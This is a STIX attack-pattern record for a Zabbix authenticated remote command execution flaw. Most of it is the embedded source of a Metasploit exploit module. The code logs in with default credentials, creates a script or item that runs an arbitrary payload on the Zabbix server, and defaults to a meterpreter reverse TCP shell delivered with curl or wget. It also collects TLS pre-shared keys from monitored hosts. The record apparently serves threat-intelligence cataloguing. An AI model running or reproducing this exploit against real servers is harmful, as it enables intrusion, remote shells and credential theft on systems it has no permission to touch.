{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b437ec4-5355-4113-951d-7faaef9fd7d7",
    "created": "2024-08-14T17:09:16.488079Z",
    "modified": "2024-08-14T17:09:16.488083Z",
    "name": "Zabbix Authenticated Remote Command Execution",
    "description": " ZABBIX allows an administrator to create scripts that will be run on hosts. An authenticated attacker can create a script containing a payload, then a host with an IP of 127.0.0.1 and run the arbitrary script on the ZABBIX host.  This module was tested against Zabbix v2.0.9, v2.0.5, v3.0.1, v4.0.18, v5.0.17, v6.0.0.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/zabbix_script_exec.rb",
            "external_id": "zabbix_script_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3628"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zabbix Authenticated Remote Command Execution',\n        'Description' => %q{\n          ZABBIX allows an administrator to create scripts that will be run on hosts.\n          An authenticated attacker can create a script containing a payload, then a host\n          with an IP of 127.0.0.1 and run the arbitrary script on the ZABBIX host.\n\n          This module was tested against Zabbix v2.0.9, v2.0.5, v3.0.1, v4.0.18, v5.0.17, v6.0.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Brandon Perry <bperry.volatile[at]gmail.com>', # Discovery / msf module\n          'lap1nou <lapinousexy[at]gmail.com>' # Update of the module / Item technique\n        ],\n        'References' => [\n          ['CVE', '2013-3628'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Linux Dropper', {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'wget', 'printf' ],\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => 'curl',\n                'MeterpreterTryToFork' => true,\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command', {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse'\n              }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2013-10-30',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'WfsDelay' => 60 },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'Username to authenticate with', 'Admin']),\n        OptString.new('PASSWORD', [ true, 'Password to authenticate with', 'zabbix']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Zabbix installation', '/zabbix/']),\n        OptString.new('TLS_PSK_IDENTITY', [ false, 'The TLS identity', '']),\n        OptString.new('TLS_PSK', [ false, 'The TLS PSK', '']),\n        OptEnum.new('TECHNIQUE', [ true, 'Choose if the module must use script or item way of achieving RCE, item is only available on Zabbix server >= 3.0 and the AllowKey=system.run[*] directive should be enabled', 'script', ['script', 'item']]),\n        OptInt.new('TIMEOUT', [ false, 'The last API calls made can take some amount of time to complete, this is the timeout to wait', 120])\n      ]\n    )\n  end\n\n  def check\n    auth_token = login\n    zabbix_version = get_version\n\n    str = rand_text_alpha(18)\n\n    script_id = create_script(auth_token, zabbix_version, \"echo #{str}\")\n    group_id = find_group_id(auth_token)\n    host_id = create_host(auth_token, group_id)\n\n    resp = execute_script(auth_token, host_id, script_id)\n\n    if resp.get_json_document.dig('result', 'value').gsub(\"\\n\", '') == str\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def send_json_api_request(method, auth_token = nil, params = {})\n    resp = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/api_jsonrpc.php'),\n      'data' => {\n        'auth' => auth_token,\n        'id' => 1,\n        'jsonrpc' => '2.0',\n        'method' => method,\n        'params' => params\n      }.to_json,\n      'ctype' => 'application/json-rpc'\n    })\n\n    fail_with(Failure::Unreachable, \"The server didn't respond\") if resp.nil?\n\n    json_document = resp.get_json_document\n\n    fail_with(Failure::UnexpectedReply, 'The server response is empty') if json_document.empty?\n\n    return json_document\n  end\n\n  def get_interfaceid(auth_token, host_id)\n    params = {\n      'hostids' => host_id,\n      'output' => 'extend'\n    }\n\n    resp = send_json_api_request('hostinterface.get', auth_token, params)\n\n    return resp['result'][0]['interfaceid']\n  end\n\n  def create_item(auth_token, host_id, payload)\n    interface_id = get_interfaceid(auth_token, host_id)\n    item_title = rand_text_alpha(18)\n    @item_title = item_title\n\n    print_status(\"Creating an item called #{item_title}\")\n\n    params = {\n      'delay' => 30,\n      'hostid' => host_id,\n      'interfaceid' => interface_id,\n      'key_' => \"system.run[#{payload},nowait]\",\n      'name' => item_title,\n      'type' => 0,\n      'value_type' => 3\n    }\n\n    send_json_api_request('item.create', auth_token, params)\n\n    vprint_good('Successfully created an item')\n  end\n\n  def create_script(auth_token, zabbix_version, payload)\n    script_title = rand_text_alpha(18)\n    @script_title = script_title\n\n    print_status(\"Creating a script called #{script_title}\")\n\n    params = {\n      'command' => payload,\n      'name' => script_title,\n      'type' => 0\n    }\n\n    if zabbix_version >= Rex::Version.new('5.4.0')\n      params[:scope] = 2\n    end\n\n    resp = send_json_api_request('script.create', auth_token, params)\n    script_id = resp.dig('result', 'scriptids', 0)\n    @script_id = script_id\n\n    return script_id\n  end\n\n  def execute_script(auth_token, host_id, script_id)\n    print_status('Executing the script...')\n\n    retry_until_truthy(timeout: datastore['TIMEOUT']) do\n      params = {\n        'scriptid' => script_id.to_s,\n        'hostid' => host_id.to_s\n      }\n\n      resp = send_json_api_request('script.execute', auth_token, params)\n\n      next if !resp['error'].nil?\n\n      return resp\n    end\n  end\n\n  def find_tls_psk(auth_token)\n    print_status('Searching for a TLS PSK (pre-shared key)...')\n\n    resp = send_json_api_request('host.get', auth_token)\n\n    # Searching for a PSK\n    resp['result'].each do |host|\n      next if host['tls_psk'].to_s.strip.empty?\n\n      print_good(\"Found a TLS PSK '#{host['tls_psk']}' for the identity '#{host['tls_psk_identity']}', setting them...\")\n      datastore['TLS_PSK'] = host['tls_psk']\n      datastore['TLS_PSK_IDENTITY'] = host['tls_psk_identity']\n      break\n    end\n  end\n\n  def exploit_script(auth_token, zabbix_version)\n    case target['Type']\n    when :unix_cmd\n      script_id = create_script(auth_token, zabbix_version, payload.encoded)\n    when :linux_dropper\n      script_id = create_script(auth_token, zabbix_version, generate_cmdstager.join)\n    end\n\n    group_id = find_group_id(auth_token)\n    host_id = create_host(auth_token, group_id)\n\n    execute_script(auth_token, host_id, script_id)\n  end\n\n  def exploit_item(auth_token)\n    group_id = find_group_id(auth_token)\n\n    if datastore['TLS_PSK'] == '' || datastore['TLS_PSK_IDENTITY'] == ''\n      find_tls_psk(auth_token)\n    end\n\n    host_id = create_host(auth_token, group_id)\n\n    case target['Type']\n    when :unix_cmd\n      create_item(auth_token, host_id, payload.encoded)\n    when :linux_dropper\n      create_item(auth_token, host_id, generate_cmdstager.join)\n    end\n  end\n\n  def find_group_id(auth_token)\n    print_status('Getting a valid group id...')\n\n    params = {\n      'output' => 'extend'\n    }\n\n    resp = send_json_api_request('hostgroup.get', auth_token, params)\n\n    group_id = resp.dig('result', 0, 'groupid')\n    @group_id = group_id\n\n    if !group_id.nil?\n      vprint_good('Successfully got a valid groupid')\n    end\n\n    return group_id\n  end\n\n  def create_host(auth_token, group_id)\n    host = rand_text_alpha(18)\n    @host_name = host\n\n    print_status(\"Creating a host called #{host}\")\n\n    params = {\n      'groups' => [\n        {\n          'groupid' => group_id\n        }\n      ],\n      'host' => host,\n      'interfaces' => [\n        {\n          'dns' => '',\n          'ip' => '127.0.0.1',\n          'main' => 1,\n          'port' => '10050',\n          'type' => 1,\n          'useip' => 1\n        }\n      ]\n    }\n\n    if datastore['TLS_PSK_IDENTITY'] != '' || datastore['TLS_PSK'] != ''\n      params[:tls_connect] = 2\n      params[:tls_psk_identity] = datastore['TLS_PSK_IDENTITY']\n      params[:tls_psk] = datastore['TLS_PSK']\n    end\n\n    resp = send_json_api_request('host.create', auth_token, params)\n\n    host_id = resp.dig('result', 'hostids', 0)\n    @host_id = host_id\n\n    vprint_good('Successfully created an host')\n\n    return host_id\n  end\n\n  def login\n    params = {\n      'password' => datastore['PASSWORD'],\n      'user' => datastore['USERNAME']\n    }\n\n    resp = send_json_api_request('user.login', nil, params)\n\n    auth_token = resp['result']\n    @auth_token = auth_token\n\n    if !auth_token.nil?\n      print_good('Successfully logged in')\n    end\n\n    return auth_token\n  end\n\n  def get_version\n    resp = send_json_api_request('apiinfo.version')\n\n    version = Rex::Version.new(resp['result'])\n    @zabbix_version = version\n\n    if !version.nil?\n      vprint_status(\"Zabbix version number #{version}\")\n    end\n\n    return version\n  end\n\n  def exploit\n    version = get_version\n    auth_token = login\n\n    if datastore['TECHNIQUE'] == 'script'\n      exploit_script(auth_token, version)\n    elsif datastore['TECHNIQUE'] == 'item'\n      exploit_item(auth_token)\n    end\n  end\n\n  def delete_host(auth_token, host_id, host_name, zabbix_version)\n    params = {}\n\n    if zabbix_version < Rex::Version.new('2.2.0')\n      params = [ { 'hostid' => host_id } ]\n    else\n      params = [ host_id ]\n    end\n\n    resp = send_json_api_request('host.delete', auth_token, params)\n\n    if !resp['result'].nil?\n      vprint_good(\"Successfully deleted '#{host_name}' host\")\n    else\n      print_warning(\"Couldn't delete the host '#{host_name}'\")\n    end\n  end\n\n  def delete_script(auth_token, script_id, script_title)\n    params = [ script_id ]\n\n    resp = send_json_api_request('script.delete', auth_token, params)\n\n    if !resp['result'].nil?\n      vprint_good(\"Successfully deleted '#{script_title}' script\")\n    else\n      print_warning(\"Couldn't delete the script '#{script_title}'\")\n    end\n  end\n\n  def cleanup\n    return unless @host_id\n\n    delete_host(@auth_token, @host_id, @host_name, @zabbix_version)\n\n    return unless @script_id\n\n    delete_script(@auth_token, @script_id, @script_title)\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "unix'"
    ]
}